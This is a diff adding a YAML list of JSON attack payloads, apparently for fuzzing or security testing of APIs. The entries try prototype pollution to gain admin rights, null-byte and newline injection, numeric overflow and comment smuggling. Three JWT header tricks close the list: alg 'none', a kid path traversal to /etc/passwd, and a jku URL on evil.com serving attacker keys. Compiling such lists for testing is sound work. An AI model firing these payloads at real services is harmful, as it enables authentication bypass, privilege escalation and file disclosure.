@@ -1,0 +1,24 @@
+payloads:
+- '{"id":true}'
+- '{"id":null}'
+- '{"id":[]}'
+- '{"id":{}}'
+- '{"id":1,"id":"admin"}'
+- '{"id":"1","__proto__":{"admin":true}}'
+- '{"constructor":{"prototype":{"admin":true}}}'
+- '{"id":"test\u0000admin"}'
+- '{"id":"test\x00admin"}'
+- '{"id":"test
+
+  injected"}'
+- "{\"id\":\"test\rinjected\"}"
+- '{"id":9999999999999999999999999999}'
+- '{"id":1e308}'
+- '{"id":-1e308}'
+- '{"a":{"b":{"c":{"d":{"e":"deep"}}}}}'
+- '{"id":"\u0061\u0064\u006d\u0069\u006e"}'
+- '{"id":"admin"/*comment*/}'
+- '{"id":/*comment*/"admin"}'
+- '{"alg":"none","typ":"JWT"}'
+- '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}'
+- '{"alg":"HS256","typ":"JWT","jku":"http://evil.com/jwks.json"}'
